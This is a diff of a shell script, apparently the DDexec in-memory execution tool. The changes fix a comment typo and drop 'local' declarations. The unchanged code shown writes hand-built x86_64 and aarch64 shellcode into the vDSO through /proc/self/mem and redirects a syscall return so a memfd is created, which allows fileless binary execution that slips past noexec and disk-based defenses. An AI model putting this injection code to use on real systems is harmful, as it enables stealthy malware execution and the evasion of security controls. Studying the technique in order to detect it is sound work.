@@ -8,7 +8,7 @@ Ex: bash ./in_mem_bin.sh & sleep 0.3; cp $(command which echo) /proc/$!/fd/4; /p
 # Global architecture
 ARCH=$(uname -m)  # x86_64 or aarch64
 
-# Clause: leave is CPU not supported
+# Clause: leave if CPU not supported
 case $ARCH in x86_64|aarch64):;; *)
   echo "DDexec: Error, this architecture is not supported." >&2
   exit 1;;
@@ -17,12 +17,12 @@ esac
 create_memfd(){
   : 'Main function: no argument, no return!'
   # Craft the shellcode to be written into the vDSO
-  local shellcode_hex="$(craft_shellcode)"
-  local shellcode_addr="$(get_section_start_addr '[vdso]')"
+  shellcode_hex="$(craft_shellcode)"
+  shellcode_addr="$(get_section_start_addr '[vdso]')"
 
   # Craft the jumper to be written to a syscall ret PC
-  local jumper_hex="$(craft_jumper "$shellcode_addr")"
-  local jumper_addr="$(get_read_syscall_ret_addr)"
+  jumper_hex="$(craft_jumper "$shellcode_addr")"
+  jumper_addr="$(get_read_syscall_ret_addr)"
   
   # Overwrite vDSO with our shellcode
   exec 3> /proc/self/mem
@@ -39,7 +39,7 @@ create_memfd(){
 
 craft_shellcode(){
   : 'Craft hex shellcode with: dup2(2, 0); memfd_create;'
-  local out=''
+  out=''
   case $ARCH in
     x86_64)
       out=4831c04889c6b0024889c7b0210f05  # dup
@@ -56,7 +56,7 @@ craft_jumper(){
   : 'Craft hex code to jump to (arg1) hex address
   -- Trampoline to jump to the shellcode
   '
-  local out="$(printf %016x "$1")"
+  out="$(printf %016x "$1")"
   case $ARCH in
     x86_64) out="48b8$(endian "$out")ffe0";;
     aarch64) out="4000005800001fd6$(endian "$out")";;
@@ -67,7 +67,7 @@ craft_jumper(){
 
 get_section_start_addr(){
   : 'Print offset of start of section with string (arg1)'
-  local out=""
+  out=""
   while read -r line; do case $line in *"$1"*)
     out=$(printf "%s" "$line" | cut -d- -f1); break
   esac; done < /proc/$$/maps
@@ -78,7 +78,7 @@ get_section_start_addr(){
 get_read_syscall_ret_addr(){
   : 'Print decimal addr where a next syscall will return, to put jumper, as trigger'
   read -r syscall_info < /proc/self/syscall
-  local out="$(printf "%s" "$syscall_info" | cut -d' ' -f9)"
+  out="$(printf "%s" "$syscall_info" | cut -d' ' -f9)"
   hex2dec "$out"
 }
 
@@ -91,7 +91,7 @@ seek(){
 
 endian(){
   : 'Change endianness of hex string (arg1)'
-  local i=${#1} out=''
+  i=${#1} out=''
   while [ "$i" -ge 0 ]; do
     out="$out$(printf "%s" "$1" | cut -c$(( i+1 ))-$(( i+2 )))"
     i=$((i-2))
@@ -102,7 +102,7 @@ endian(){
 
 unhexify(){
   : 'Convert hex string (arg1) to binary stream (stdout)'
-  local escaped='' i=0 num=0
+  escaped='' i=0 num=0
   while [ "$i" -lt "${#1}" ]; do
     num=$(( 0x$(printf "%s" "$1" | cut -c$(( i+1 ))-$(( i+2 ))) ))
     escaped="$escaped\\$(printf "%o" "$num")"
